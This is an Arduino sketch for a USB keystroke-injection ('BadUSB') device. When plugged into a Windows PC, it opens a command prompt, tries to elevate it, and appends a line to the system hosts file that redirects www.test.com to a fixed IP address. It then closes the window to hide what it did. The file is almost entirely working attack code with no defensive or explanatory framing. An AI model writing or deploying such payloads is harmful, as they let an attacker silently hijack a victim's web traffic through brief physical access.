#include <Keyboard.h> 

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  typeKey(KEY_RETURN);
  delay(400);
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cd C:--Windows<<System32<<drivers°°etc°°");
delay(5000);
  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("echo 200.68.105.168 www.test.com>>hosts");

  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  Keyboard.print("c");
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
